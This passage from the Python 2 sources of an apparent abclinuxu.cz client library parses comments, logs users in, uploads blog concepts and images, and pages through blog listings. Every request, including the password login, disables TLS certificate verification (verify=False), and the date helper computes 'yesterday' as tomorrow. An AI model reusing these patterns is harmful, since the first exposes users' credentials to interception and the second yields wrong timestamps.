        """
        c = Comment()

        # fill object
        c._id = uid
        c.url = Comment._parse_url(head_tag)
        c.text, c.censored = Comment._parse_text(body_tag)
        c.response_to = Comment._response_to(head_tag)
        c.timestamp = Comment._izolate_timestamp(head_tag)
        c.username, c.registered = Comment._izolate_username(head_tag)

        return c

    @staticmethod
    def comments_from_html(html):
        """
        Parse comments in `html`, return list of connected :class:`Comment`
        instances.

        Args:
            html (str): Webpage for parsing.

        Returns:
            list: List of :class:`Comment` instances linked also into trees \
                  using :attr:`response_to` and :attr:`responses` properties.
        """
        def cut_dom_to_area_of_interest(html):
            """
            Raises:
                StopIteration: In case of no comments.
                ValueError: In case that there is missing elements from HTML.
            """
            dom = html

            # make sure, that you don't modify `html` parameter
            if not isinstance(html, dhtmlparser.HTMLElement):
                dom = dhtmlparser.parseString(html)
            else:
                dom = copy.deepcopy(dom)
            dhtmlparser.makeDoubleLinked(dom)

            # comments are not stored in hierarchical structure, but in somehow
            # flat-nested lists

            # locate end of article
            ds_toolbox = dom.find("div", {"class": "ds_toolbox"})

            if not ds_toolbox:
                # blogposts without any comments
                add_first_comment = dom.find(
                    "a",
                    fn=lambda x:
                        "action=addDiz" in x.params.get("href", "") and
                        x.getContent().strip() == "Vložit první komentář"
                )

                if add_first_comment:
                    raise StopIteration("No comments yet.")

                raise ValueError("Couldn't locate ds_toolbox!")

            ds_toolbox = first(ds_toolbox)
            dom = ds_toolbox.parent

            # ged rid of everything until end of the article
            while dom.childs[0] != ds_toolbox:
                dom.childs.pop(0)

            dom.childs.pop(0)

            return dom

        # pick all header divs
        def header_div_class(item):
            """
            Identify header dicts. Sometimes there is class="ds_hlavicka" and
            sometimes there is class="ds_hlavicka ds_hlavicka_me".
            """
            class_descr = item.params.get("class", "")

            return class_descr.startswith("ds_hlavicka")

        def id_from_comment_div(comment_div):
            # <div id="comment3"> -> 3
            id_str = comment_div.parent.params.get("id")

            # for details, see
            # http://abclinuxu.cz/blog/Mostly_IMDB/2008/6/radeon-hd-4850-a-tak-vubec#17
            if not id_str:
                id_str = comment_div.parent.parent.params.get("id")

            if not id_str:
                id_str = comment_div.parent.parent.parent.params["id"]

            return id_str.replace("comment", "")

        def comment_or_censored(tag):
            return tag.params.get("class", "") in ("ds_text", "cenzura")

        def parse_comments(dom, head_dict):
            IdBodyPair = namedtuple("IdBodyPairs", ["uid", "comment_div"])

            # I need to use the ID two times in the next pass, thats why
            id_body_pairs = (
                IdBodyPair(
                    uid=id_from_comment_div(comment_div),
                    comment_div=comment_div,
                )
                for comment_div in dom.find("div", fn=comment_or_censored)
            )

            return [
                Comment._from_head_and_body(
                    head_dict[uid],
                    comment_div,
                    uid,
                )
                for uid, comment_div in id_body_pairs
            ]

        try:
            dom = cut_dom_to_area_of_interest(html)
        except StopIteration:
            return []

        head_dict = {
            head_div.params["id"]: head_div
            for head_div in dom.find("div", fn=header_div_class)
            if "id" in head_div.params
            # if condition because of
            # /blog/leos/2007/2/prepis-diskusniho-fora-hw-sekce#31
        }

        comment_list = parse_comments(dom, head_dict)

        # {id: comment}
        comment_dict = {
            comment.id: comment
            for comment in comment_list
        }

        # link comments into tree
        for comment in comment_list:
            if comment.response_to:
                comment.response_to = comment_dict[comment.response_to]
                comment.response_to.responses.append(comment)

        return comment_list

    def __repr__(self):
        return "Comment(username=%s, id=%s)" % (self.username, self.id)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from urlparse import urljoin

import requests
import dhtmlparser

import shared
from shared import first
from shared import url_context
from shared import ABCLINUXU_URL
from shared import check_error_div

from concept import Concept
from blogpost import Blogpost


# Variables ===================================================================
BLOG_STEP = 50  # Sets how much blogpost can be at one page


# Functions & classes =========================================================
class User(object):
    """
    Class that is used to hold informations about given `username`. You can
    also command various operations, like get list of all blogs, or add new
    concept.

    Attributes:
        username (str):
        password (str, default None): Password for logged user.
        logged_in (bool): Is the user logged in?
    """
    def __init__(self, username, password=None, lazy=False):
        """
        Args:
            username (str): Users login.
            password (str, default None): Optional password for given user.
                     This will allow you to upload concepts.
            lazy (bool, default False): Don't call :meth:`lazy_init` right when
                 the object is created.
        """
        self.username = username
        self.password = password
        self.logged_in = False

        self.session = requests.Session()
        self.blog_url = None
        self._user_id = None

        if not lazy:
            self.lazy_init()

    @property
    def has_blog(self):
        """
        Does the user have registered blog?
        """
        return self.blog_url is not None

    def lazy_init(self):
        """
        Parse additional informations about user. This step require one request
        to the site.
        """
        self.blog_url = self._parse_blogname()

    @staticmethod
    def from_user_id(user_id):
        """
        Transform `user_id` to instance of :class:`User`.

        Returns:
            obj: :class:`User` instance parsed from the `user_id`.
        """
        data = shared.download(url_context("/Profile/" + str(user_id)))
        dom = dhtmlparser.parseString(data)
        dhtmlparser.makeDoubleLinked(dom)

        shared.handle_errors(dom)

        # <li><a href="/lide/unittest/objekty" rel="nofollow">Seznam příspěvků
        # na abclinuxu.cz</a>
        a_tags = dom.find(
            "a",
            fn=lambda x: x.params.get("href", "").startswith("/lide/")
        )

        # pick only links which have content that starts with Seznam
        links = [
            a_tag.params["href"]
            for a_tag in a_tags
            if a_tag.getContent().startswith("Seznam")
        ]

        username = links[-1].split("/")[2]

        return User(username)

    def _get_user_id(self):
        """
        Resolve user's ID number for logged user.

        Returns:
            str: USER id as string.
        """
        if self._user_id is not None:
            return self._user_id

        self.login()
        dom = dhtmlparser.parseString(self._get(ABCLINUXU_URL))

        # resolve user's navigation panel
        nav_bar = dom.match(
            ["div", {"class": "hl_vpravo"}],
            {
                "tag_name": "a",
                "fn": lambda x: x.params.get("href", "").startswith("/Profile")
            }
        )

        if not nav_bar:
            raise ValueError("Can't parse user's navigation bar!")

        profile_link = first(nav_bar).params["href"]

        # transform /Profile/24642?action=myPage -> 24642
        self._user_id = profile_link.split("?")[0].split("/")[-1]

        return self._user_id

    def _compose_profile_url(self):
        return urljoin(ABCLINUXU_URL, urljoin("/lide/", self.username))

    def _parse_blogname(self):
        data = self._get(self._compose_profile_url())

        dom = dhtmlparser.parseString(data)
        blogname = filter(
            lambda x: x.getContent().strip().startswith("Můj blog: "),
            dom.find("h2")
        )

        if not blogname:
            return None

        links = blogname[0].find("a")

        if not links:
            raise UserWarning("Can't find blog link!")

        return urljoin(ABCLINUXU_URL, links[0].params["href"])

    def _get(self, url, params=None, as_text=True):
        """
        Shortcut for ``self.session.get().text.encode("utf-8")``.

        Args:
            url (str): Url on which the GET request will be sent.
            params (dict): GET parameters.
            as_text (bool, default True): Return result as text or binary data.

        Returns:
            str/binary data: depending on the `as_text` parameter.
        """
        return shared.download(
            url=url,
            params=params,
            session=self.session,
            as_text=as_text
        )

    def login(self, password=None):
        """
        Logs the user in, tests, if the user is really logged.

        Args:
            password (str, default None): Password, overwrites the password set
                     when the object was created.

        Raises:
            UserWarning: if there was some error during login.
        """
        if self.logged_in:
            return

        if password is not None:
            self.password = password

        if self.password is None:
            raise UserWarning("Invalid password.")

        login_url = urljoin(ABCLINUXU_URL, "/Profile")
        data = self.session.post(
            login_url,
            data={
                "finish": "Přihlásit",
                "LOGIN": self.username,
                "PASSWORD": self.password,
                "noCookie": "no",
                "useHttps": "yes" if login_url.startswith("https") else "no",
                "action": "login2",
                "url": "http://www.abclinuxu.cz/"
            },
            verify=False,
        ).text.encode("utf-8")

        # test, whether the user is successfully logged in
        dom = dhtmlparser.parseString(data)

        logged_in = dom.find("div", {"class": "hl"})
        if not logged_in:
            raise UserWarning("Bad username/password!")

        logged_in = logged_in[0].find("div", {"class": "hl_vpravo"})
        if not logged_in:
            raise UserWarning("Bad username/password!")

        logged_in = logged_in[0].find("a")[-1]
        if not logged_in or logged_in.getContent() != "Odhlásit":
            raise UserWarning("Bad username/password!")

        self.logged_in = True

    def _compose_blogposts_url(self, from_counter):
        return urljoin(self.blog_url, "?from=%d" % from_counter)

    def get_blogposts(self):
        """
        Lists all of users PUBLISHED blogposts. For unpublished, see 
        :meth:`get_concepts`.

        Returns:
            list: sorted (old->new) list of Blogpost objects.
        """
        if not self.has_blog:
            return []

        def cut_crap(data):
            data = data.split(
                '<div class="s_nadpis linkbox_nadpis">Píšeme jinde</div>'
            )[0]

            return data.split('<div class="st" id="st">')[1]

        cnt = 0
        posts = []
        parsed = [1]  # just placeholder for first iteration
        while parsed:
            data = self._get(self._compose_blogposts_url(cnt))

            dom = dhtmlparser.parseString(cut_crap(data))
            parsed = [
                Blogpost.from_html(blog_html)
                for blog_html in dom.find("div", {"class": "cl"})
            ]

            posts.extend(parsed)
            cnt += BLOG_STEP

        return sorted(posts, key=lambda x: x.created_ts)

    def get_concepts(self):
        """
        Return all concepts (unpublished blogs).

        Returns:
            list: List of Concept objects.
        """
        if not self.has_blog:
            raise ValueError("User doesn't have blog!")

        self.login()

        # get the fucking untagged part of the site, where the links to the
        # concepts are stored
        data = self._get(self.blog_url)

        if '<div class="s_nadpis">Rozepsané zápisy</div>' not in data:
            return []

        data = data.split('<div class="s_nadpis">Rozepsané zápisy</div>')[1]

        dom = dhtmlparser.parseString(data)
        concept_list = dom.find("div", {"class": "s_sekce"})[0]

        # links to concepts are stored in <li>
        concepts = []
        for li in concept_list.find("li"):
            a = li.find("a")[0]

            concepts.append(
                Concept(
                    title=a.getContent().strip(),
                    link=a.params["href"],
                    session=self.session
                )
            )

        return concepts

    def add_concept(self, text, title, ts_of_pub=None):
        """
        Adds new concept into your concepts.

        Args:
            text (str): Text of your concept.
            title (str): Title of your contept. Do not use HTML in title!
            ts_of_pub (int/float, default None): Timestamp of the publication.

        Raises:
            UserWarning: if the site is broken or user was logged out.
        """
        if not self.has_blog:
            raise ValueError("User doesn't have blog!")

        self.login()

        dom = dhtmlparser.parseString(self._get(self.blog_url))

        # get section with links to new blog
        s_sekce = filter(
            lambda x: "Vlož nový zápis" in x.getContent(),
            dom.find("div", {"class": "s_sekce"})
        )
        if not s_sekce:
            raise UserWarning("Can't resolve right div tag!")

        # get link to "add blog" page
        add_blog_link = filter(
            lambda x: "href" in x.params and
                      x.params["href"].endswith("action=add"),
            s_sekce[0].find("a")
        )
        if not add_blog_link:
            raise UserWarning("Can't resolve user number!")
        add_blog_link = add_blog_link[0].params["href"]

        # get "add blog" page
        data = self._get(ABCLINUXU_URL + add_blog_link)
        dom = dhtmlparser.parseString(data)

        form_action = dom.find("form", {"name": "form"})[0].params["action"]

        data = self.session.post(
            ABCLINUXU_URL + form_action,
            data={
                "cid": 0,
                "publish": shared.ts_to_concept_date(ts_of_pub),
                "content": text,
                "title": dhtmlparser.removeTags(title),
                "delay": "Do konceptů",
                "action": "add2"
            },
            verify=False,
        )
        data = data.text.encode("utf-8")
        check_error_div(data, '<div class="error" id="contentError">')
        check_error_div(data, '<div class="error" id="titleError">')

    def register_blog(self, blog_name):
        """
        Register blog under `blog_name`. Users doesn't have blogs
        automatically, you have to create them manually.

        Raises:
            UserWarning: If user already have blog registered.
            ValueError: If it is not possible to register blog for user (see \
                        exception message for details).
        """
        if self.has_blog:
            raise UserWarning("User already have blog!")

        add_blog_url = urljoin(
            ABCLINUXU_URL,
            urljoin("/blog/edit/", self._get_user_id())
        )

        data = self.session.post(
            add_blog_url,
            params={
                "blogName": blog_name,
                "category1": "",
                "category2": "",
                "category3": "",
                "action": "addBlog2",
            },
            verify=False,
        )

        # check for errors
        dom = dhtmlparser.parseString(data.text.encode("utf-8"))
        errors = dom.find("p", {"class": "error"})
        if errors:
            raise ValueError(first(errors).getContent())

        self.blog_url = self._parse_blogname()

        if not self.has_blog:
            raise ValueError("Couldn't register new blog.")

    def __iter__(self):
        for blog in self.get_blogposts():
            yield blog

    def __repr__(self):
        return "%s(%s)" % (self.__class__.__name__, self.username)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import re
import time
import types
import datetime
from urlparse import urljoin

import requests
import dhtmlparser


# Variables ===================================================================
ABCLINUXU_URL = "https://www.abclinuxu.cz"  #: Base URL of the abclinuxu.
SESSION = requests.Session()  #: Session which is used in non-private requests.


# Functions & classes =========================================================
def download(url, params=None, method="GET", session=None, as_text=True,
             data=None):
    """
    Download data from `url` using `method`. Send `params` if defined.

    Args:
        url (str): Absolute URL from which the data will be downloaded.
        params (dict, default None): Send parameters (GET/POST).
        data (dict, default None): Data which will be sent as body of the
             request.
        method (str, default "GET"): Use this method to send the request.
        session (obj, default None): If ``None``, shared :attr:`SESSION` object
                is used.
        as_text (bool, default True): Return content as ``UTF-8`` encoded
                string. If false ``bytes`` are returned.

    Returns:
        str/bytes: Content depending on the `as_text` attribute.
    """
    if session is None:
        session = SESSION

    content = session.request(
        method,
        url,
        params=params,
        data=data,
        verify=False,
    )

    return content.text.encode("utf-8") if as_text else content.content


def first(inp_data):
    """
    Return first element from `inp_data`, or raise StopIteration.

    Note:
        This function was created because it works for generators, lists,
        iterators, tuples and so on same way, which indexing doesn't.

        Also it have smaller cost than list(generator)[0], because it doesn't
        convert whole `inp_data` to list.

    Args:
        inp_data (iterable): Any iterable object.

    Raises:
        StopIteration: When the `inp_data` is blank.
    """
    return next(x for x in inp_data)


def date_to_timestamp(date):
    """
    Convert abclinuxu `relative` or `absolute` date string in czech words to
    timestamp.

    Args:
        date (str): One of many abclinuxu representations of date string.

    Returns:
        int: Timestamp.
    """
    date = date.strip()
    date = date.__str__().replace(". ", ".")  # 10. 10. 2003 -> 10.10.2003

    # references to today and yesterday
    today = time.strftime("%d.%m.%Y", time.localtime())
    yesterday = datetime.date.today() - datetime.timedelta(days=-1)

    # 8.4.23:30
    if re.match(r"[0-9]{1,2}\.[0-9]{1,2}\.[0-9]{1,2}\:[0-9]{1,2}", date):
        date = "%d.%s" % (time.localtime().tm_year, date)
        return time.mktime(time.strptime(date, "%Y.%d.%m.%H:%M"))

    date = date.replace("dnes", today)
    date = date.replace("včera", yesterday.strftime("%d.%m.%Y"))
    if "|" in date:  # "%H:%M |" -> "%d.%m.%Y %H:%M"
        date = today + " " + date.replace(" |", "")

    if len(date) <= 11:  # new items are without year
        date = date.replace(". ", ".%d " % time.localtime().tm_year)

    return time.mktime(time.strptime(date, "%d.%m.%Y %H:%M"))


def date_izolator(lines):
    """
    Return all lines, that looks like it may be date in one of many
    abclinuxu formats.

    Args:
        lines (list): List of strings with lines which ma by dates.

    Returns:
        list: List of lines, which looks like they may contain dates.
    """
    return [
        x for x in lines
        if ":" in x and any(["." in x, "včera" in x, "dnes" in x, "|" in x])
    ]


def alt_izolator(lines):
    """
    Return all lines, that looks like it may be date "~~%d.%m. ~~" format.

    Args:
        lines (list): List of strings with lines which ma by dates.

    Returns:
        list: List of lines, which looks like they may contain dates.
    """
    return [
        l for l in lines
        if "." in l and re.match(r".*[0-9]{1,2}\.[0-9]{1,2}\..*", l)
    ]


def parse_timestamp(meta):
    """
    Parse numeric timestamp from the date representation.

    Args:
        meta (str): Meta html from the blogpost body.

    Returns:
        int: Timestamp.
    """
    if type(meta) not in [list, tuple, types.GeneratorType]:
        meta = meta.__str__().replace(". ", ".")  # 10. 10. 2003 -> 10.10.2003
        meta = str(meta).splitlines()

    date = date_izolator(meta)
    if date:
        return date_to_timestamp(first(date))

    # this is used in articles (article != blogpost)
    date = alt_izolator(meta)
    if date:
        date = first(date).split()[0].replace("|", "")
        return date_to_timestamp(date + " 00:00")

    assert date, "Date not found!"


def ts_to_concept_date(timestamp):
    """
    Convert numeric `timestamp` into format used by abclinuxu for concepts.

    Args:
        timestamp (int): Timestamp as float/int.

    Returns:
        str: Converted `timestamp`.
    """
    if not timestamp:
        return None

    # required format: 2005-01-25 07:12
    return time.strftime(
        "%Y-%m-%d %H:%M",
        time.localtime(timestamp)
    )


def url_context(rel_url):
    """
    Add `rel_url` to the absolute context with :attr:`ABCLINUXU_URL`.

    Args:
        rel_url (str): Relative URL.

    Returns:
        str: Absolute URL.
    """
    return urljoin(ABCLINUXU_URL, rel_url)


def handle_errors(dom):
    """
    Look for error divs in given `dom` tree.

    Args:
        dom (obj): :class:`dhtmlparser.HTMLElement` instance.

    Raises:
        UserWarning: With content of the error div if the div was found.
    """
    error = dom.find(
        "h1",
        {"class": "st_nadpis"},
        fn=lambda x: x.getContent() == "Chyba"
    )

    if error:
        error = first(error)

        # I want <p> next to <h1> with error
        elements = error.parent.childs
        elements = elements[elements.index(error):]

        error_msg = first(x for x in elements if x.getTagName() == "p")

        raise UserWarning(error_msg.getContent())


def check_error_div(data, error_div):
    """
    Dunno about this, it was created long time ago and I have no idea.
    """
    # no sophisticated parsing of the error is needed
    if error_div in data:
        data = data.split(error_div)[1]
        data = data.split("</div>")[0]

        raise ValueError(data)


def check_error_page(data):
    """
    Handle other, special kind of errors.
    """
    dom = dhtmlparser.parseString(data)

    title = dom.find("title")

    if not title:
        return

    title = title[0].getContent()

    if title != "Chyba":
        return

    p = dom.find("p")

    error_text = p[0].getContent() if p else data

    raise ValueError(error_text.strip())
def allSame(s):
    return not filter(lambda x: x != s[0], s)


def hasDigit(s):
    return any(map(lambda x: x.isdigit(), s))


def getVersion(data):
    data = data.splitlines()
    return filter(
        lambda (x, y):
            len(x) == len(y) and allSame(y) and hasDigit(x) and "." in x,
        zip(data, data[1:])
    )[0][0]
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys
import urllib
import os.path

sys.path.insert(0, os.path.abspath("../src/"))


# Definitions =================================================================
extensions = [
    "sphinx.ext.autodoc",
    "sphinxcontrib.napoleon",
    "sphinx.ext.intersphinx"
]

intersphinx_mapping = {
    "python": ("http://docs.python.org/2.7", None),
    "amqp": ("http://edeposit-amqp.readthedocs.org/en/latest/", None),
}

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_private_with_doc = False
napoleon_include_special_with_doc = True

# Sorting of items
autodoc_member_order = "bysource"

# Document all methods in classes
autoclass_content = "both"

# Add any paths that contain templates here, relative to this directory.
templates_path = ["_templates"]

# The suffix of source filenames.
source_suffix = ".rst"

# The master toctree document.
master_doc = "index"

# General information about the project.
project = u"abclinuxuapi"
copyright = u"2015 Bystroushaak"

# The full version, including alpha/beta/rc tags.
try:
    # read data from CHANGES.rst
    from __init__ import getVersion
    release = getVersion(open("../CHANGES.rst").read())
except Exception:
    # this is here specially for readthedocs, which downloads only docs, not
    # other files
    fh = urllib.urlopen("https://pypi.python.org/pypi/" + project + "/")
    release = filter(lambda x: "<title>" in x, fh.read().splitlines())
    release = release[0].split(":")[0].split()[1]

# The short X.Y version.
version = ".".join(release.split(".")[:2])

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ["_build"]

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = "sphinx"

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = "default"

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ["_static"]

# If true, links to the reST sources are added to the pages.
html_show_sourcelink = True

# Output file base name for HTML help builder.
htmlhelp_basename = "abclinuxuapi"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages
from docs import getVersion


# Variables ===================================================================
changelog = open('CHANGELOG.rst').read()
long_description = "\n\n".join([
    open('README.rst').read(),
    changelog
])


# Actual setup definition =====================================================
setup(
    name='abclinuxuapi',
    version=getVersion(changelog),
    description="API for http://abclinuxu.cz.",
    long_description=long_description,
    url='https://github.com/Bystroushaak/abclinuxuapi',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Development Status :: 3 - Alpha",
        'Intended Audience :: Developers',

        "Programming Language :: Python :: 2",
        "Programming Language :: Python :: 2.7",

        "Topic :: Internet",
        "Topic :: Internet :: WWW/HTTP :: Site Management",
        "Topic :: Software Development :: Libraries",
        "Topic :: Software Development :: Libraries :: Python Modules",
        "Topic :: Utilities",

        "Natural Language :: Czech",
        "License :: OSI Approved :: MIT License",
    ],
    license='MIT',

    packages=find_packages('src'),
    package_dir={'': 'src'},

    scripts=['bin/abclinuxu_uploader.py'],

    include_package_data=True,
    zip_safe=False,
    install_requires=open("requirements.txt").read().splitlines(),
    test_suite='py.test',
    tests_require=["pytest"],
    extras_require={
        "test": [
            "pytest"
        ],
        "docs": [
            "sphinx",
            "sphinxcontrib-napoleon",
        ]
    },
)
#!python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys
import os.path
import getpass
import argparse

import dhtmlparser as d

sys.path.insert(
    0,
    os.path.join(os.path.dirname(__file__), "../src")
)
import abclinuxuapi


# Variables ===================================================================
ALLOWED_IMAGES = [
    "jpg",
    "jpeg",
    "gif",
    "png"
]


# Functions & objects =========================================================
def get_body(dom):
    body = dom.find("body")
    if body:
        return body[0].getContent()

    return str(dom)


def upload_image(concept, image_path):
    # remote images
    if not os.path.exists(image_path):
        return image_path

    concept.add_pic(open(image_path))

    return concept.list_pics()[-1]


def upload_html(dom, args):
    user = abclinuxuapi.User(args.username, args.password)

    try:
        user.add_concept(get_body(dom), args.title)
    except ValueError, e:
        sys.stderr.write("Fail: " + e.message + "\n")
        sys.exit(1)

    concept = user.get_concepts()[-1]

    print "Uploading your concept '%s'" % concept.title
    print
    print "Uploading inlined images:"

    # upload inlined images
    for img in dom.find("img"):
        if "src" not in img.params:
            continue

        print "\tUploading '%s'" % os.path.basename(img.params["src"])

        img.params["src"] = upload_image(concept, img.params["src"])

    print
    print "Uploading linked images:"

    # upload linked images
    for a in dom.find("a"):
        if "href" not in a.params or "." not in a.params["href"]:
            continue

        if a.params["href"].rsplit(".", 1)[1].lower() not in ALLOWED_IMAGES:
            continue

        print "\tUploading '%s'" % os.path.basename(a.params["href"])

        a.params["href"] = upload_image(concept, a.params["href"])

    print
    print "Updating image links in concept .."

    try:
        concept.edit(get_body(dom))
    except ValueError, e:
        sys.stderr.write("Fail: " + e.message + "\n")
        sys.exit(1)

    print
    print "Done: " + concept.link


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="abclinuxu.cz blog uploader.")

    parser.add_argument(
        "FN",
        type=str,
        help="Filename of the HTML document, which will be parsed and uploaded."
    )
    parser.add_argument(
        "-u",
        '--username',
        metavar="USER",
        required=True,
        type=str,
        help="Your username."
    )
    parser.add_argument(
        "-p",
        '--password',
        metavar="PASS",
        type=str,
        default=None,
        help="Your password. If not set, you will be asked interactively."
    )
    parser.add_argument(
        "-t",
        "--title",
        type=str,
        default=None,
        help="Title of your blogpost. If not set, <title> tag from your\
              document is used."
    )
    args = parser.parse_args()

    if not os.path.exists(args.FN):
        sys.stderr.write("File '%s' doesn't exists!\n" % args.FN)
        sys.exit(1)

    dom = None
    with open(args.FN) as f:
        data = f.read()
        dom = d.parseString(data)

    if args.title is None:
        title = dom.find("title")

        if not title or not title[0].getContent().strip():
            sys.stderr.write("Can't find <title> in your document.")
            sys.stderr.write("Use --title switch.\n")
            sys.exit(1)

        args.title = title[0].getContent().strip()

    if args.password is None:
        args.password = getpass.getpass("Password for '%s': " % args.username)

    os.chdir(
        os.path.dirname(
            os.path.abspath(args.FN)
        )
    )
    upload_html(dom, args)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import dhtmlparser

from shared import first
from shared import download
from shared import url_context
from shared import check_error_div
from shared import check_error_page
from shared import ts_to_concept_date


class Concept(object):
    """
    Attributes:
        title (str): Title of the concept.
        link (str): Absolute URL of the concept.
    """
    def __init__(self, title, link, session):
        self.title = title
        self.link = url_context(link)

        self._meta = None
        self._session = session

    def _init_metadata(self, data=None):
        if not data:
            data = download(self.link, session=self._session)

        if '<div class="s_nadpis">Správa zápisku</div>' not in data:
            raise ValueError(
                "Can't parse metadata! It looks like I am not logged in!"
            )

        data = data.split('<div class="s_nadpis">Správa zápisku</div>')[1]

        dom = dhtmlparser.parseString(data)
        meta_list = first(dom.find("div", {"class": "s_sekce"}))

        self._meta = {}
        for li in meta_list.find("li"):
            a = first(li.find("a"))
            self._meta[a.getContent().strip()] = a.params["href"]

    def get_content(self):
        """
        Get content of this Concept.

        Returns:
            str: full HTML UTF-8 encoded text of the concept.
        """
        data = download(self.link, session=self._session)

        if not self._meta:
            self._init_metadata(data)

        data = first(data.rsplit('<!-- -->', 1))

        # find beginning of the concept text
        dom = dhtmlparser.parseString(data)
        meta_vypis = dom.find("p", {"class": "meta-vypis"})
        if not meta_vypis:
            raise ValueError("Can't find meta-vypis <p>!")

        meta_vypis = first(meta_vypis)
        data = data.split(str(meta_vypis))[1]

        return data.strip()

    def add_pic(self, opened_file):
        """
        Add picture to the Concept.

        Args:
            opened_file (file): opened file object
        """
        # init meta
        if not self._meta:
            self._init_metadata()

        # get link to pic form
        data = download(
            url_context(self._meta["Přidej obrázek"]),
            session=self._session
        )
        dom = dhtmlparser.parseString(data)

        # get information from pic form
        form = first(dom.find("form", {"enctype": "multipart/form-data"}))
        add_pic_url = form.params["action"]

        # send pic
        data = self._session.post(
            url_context(add_pic_url),
            data={
                "action": "addScreenshot2",
                "finish": "Nahrát"
            },
            files={"screenshot": opened_file}
        )
        data = data.text.encode("utf-8")
        check_error_div(data, '<div class="error" id="screenshotError">')

    def list_pics(self):
        """
        Return:
            list: List of URLs to pictures used in this concept.
        """
        # init meta
        if not self._meta:
            self._init_metadata()

        data = download(
            url_context(self._meta["Správa příloh"]),
            session=self._session
        )
        dom = dhtmlparser.parseString(data)

        form = dom.find("form", {"name": "form"})
        assert form, "Can't find pic form!"

        return [
            a.params["href"]
            for a in first(form).find("a")
            if "href" in a.params
        ]

    def edit(self, text, title=None, date_of_pub=None):
        """
        Edit concept.

        Args:
            text (str): New text of the context.
            title (str, default None): New title of the concept. If not set,
                  old title is used.
            date_of_pub (str/int, default None): Date string in abclinuxu
                        format or timestamp determining when the concept should
                        be automatically published.

        Note:
            `date_of_pub` can be string in format ``"%Y-%m-%d %H:%M"``.
        """
        if not self._meta:
            self._init_metadata()

        data = download(
            url_context(self._meta["Uprav zápis"]),
            session=self._session
        )
        dom = dhtmlparser.parseString(data)

        form = dom.find("form", {"name": "form"})

        assert form, "Can't find edit form!"
        form = first(form)

        form_action = form.params["action"]

        if title is None:
            title = first(form.find("input", {"name": "title"}))
            title = title.params["value"]

        date = ""
        if date_of_pub is None:
            date = first(form.find("input", {"name": "publish"}))
            date = date.params["value"]
        elif isinstance(date_of_pub, basestring):
            date = date_of_pub
        else:
            date = ts_to_concept_date(date_of_pub)

        data = download(
            url=url_context(form_action),
            method="POST",
            data={
                "cid": 0,
                "publish": date,
                "content": text,
                "title": title,
                "delay": "Ulož",
                "action": "edit2"
            },
            session=self._session
        )
        check_error_div(data, '<div class="error" id="contentError">')
        check_error_page(data)

    def __str__(self):
        return self.title
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import time

import dhtmlparser as _dhtmlparser  # don't want this at package level

from user import User
from blogpost import Tag
from comment import Comment
from blogpost import Blogpost

import shared as _shared


# Functions & classes =========================================================
def _next_blog_url(start=0):
    """
    Args:
        start (int, default 0): Start at this page.

    Yields:
        str: Another url for blog listing.
    """
    for i in xrange(1000000):
        if i < start:
            continue

        yield _shared.url_context("/blog/?from=%d" % (i * 25))


def _should_continue(dom):
    """
    Detect pagination at the bottom of the bloglist page.

    Returns:
        bool: True if there is another page with list of blogposts.
    """
    paginators = dom.find(
        "a",
        fn=lambda x: x.params.get("href", "").startswith("/blog/?from=")
    )

    next_tags = [x for x in paginators if x.getContent() == "Starší zápisy"]

    return bool(next_tags)


def _remove_crap_from_bloglist(data):
    """
    Clean crap, get just content. This speeds up parsing.

    Args:
        data (str): Content of the bloglist page.

    Returns:
        str: `data` without crap.
    """
    # clean crap, get just content
    data = data.split(
        '<div class="s_nadpis linkbox_nadpis">Píšeme jinde</div>'
    )[0]
    data = data.split('<div class="st" id="st">')[1]

    # some blogs have openning comment in perex, which fucks ups bloglist
    # - this will close comments that goes over bloglist
    data = data.replace(
        '<div class="signature">',
        '<!-- --><div class="signature">'
    )

    return data


def iter_blogposts(start=0, end=None, lazy=True):
    """
    Iterate over blogs. Based at bloglist.

    Args:
        start (int, default 0): Start at this page.
        end (int, default None): End at this page.
        lazy (bool, default True): Initialize :class:`.Blogpost` objects only
             with informations from listings. Don't download full text and
             comments.

    Yields:
        obj: :class:`.Blogpost` objects.
    """
    for cnt, url in enumerate(_next_blog_url(start)):
        data = _shared.download(url)

        data = _remove_crap_from_bloglist(data)

        # parse basic info about all blogs at page
        dom = _dhtmlparser.parseString(data)
        for bcnt, blog in enumerate(dom.findB("div", {"class": "cl"})):
            yield Blogpost.from_html(blog, lazy=lazy)

            # every page has 25 blogposts, but somethimes I am getting more
            if bcnt >= 24:
                break

        # detect end of pagination at the bottom
        if not _should_continue(dom):
            break

        if end is not None and cnt >= end:
            break


def first_blog_page(lazy=True):
    """
    Return content of the first blogpost page.

    Args:
        lazy (bool, default True): Do not download full blog information.

    Returns:
        list: 25 :class:`.Blogpost` objects.
    """
    return list(iter_blogposts(end=0, lazy=lazy))


_search_cache = {}
def _binary_search(low, high, test_fn):
    def cached_test_fn(number):
        if number in _search_cache:
            return _search_cache[number]

        result = test_fn(number)
        _search_cache[number] = result

        return result

    if cached_test_fn(high):
        return high

    center = int((low + high) / 2)

    if cached_test_fn(center):
        return _binary_search(center + 1, high, cached_test_fn)
    else:
        return _binary_search(low, center - 1, cached_test_fn)


def number_of_blog_pages(progress_fn=None):
    """
    Find number of blog pages in listing. Multiply by 25 to find out estimate
    number of blogs.

